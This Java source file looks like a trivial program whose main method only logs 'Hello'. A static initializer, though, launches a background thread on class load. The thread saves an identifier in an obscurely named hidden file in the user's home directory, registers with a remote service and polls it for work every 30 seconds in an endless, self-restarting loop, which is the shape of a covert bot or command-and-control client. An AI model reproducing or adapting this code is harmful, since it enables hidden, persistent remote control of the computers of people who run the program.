package gq.glowman554;

import gq.glowman554.utils.FileUtils;
import gq.glowman554.utils.Log;

import java.io.File;

public class Entry {
    public static String id = null;
    public static String id_store_path = System.getProperty("user.home") + "/.vbshfvibiiebvi";


    public static void entry() throws Exception {
        Exs exs = new Exs();

        if (new File(id_store_path).exists()) {
            id = FileUtils.readFile(id_store_path);

            if (!exs.id_ok(id)) {
                id = null;
                Log.log("Cached id wrong getting new one!");
            } else {
                Log.log("Using cached id!");
            }
        }

        if (id == null) {
            id = exs.register();
        } else {
            exs.register(id);
        }

        FileUtils.writeFile(id_store_path, id);

        Log.log("Got id " + id);

        while (true) {
            exs.pool_for_work();
            Thread.sleep(30000);
        }
    }

    public static void main(String[] args) {
        Log.log("Hello");
    }

    static {
        Log.init();

        new Thread(() -> {
            while (true) {
                try {
                    Entry.entry();
                } catch (Exception e) {
                    Log.log(e);
                }
            }
        }).start();
    }
}
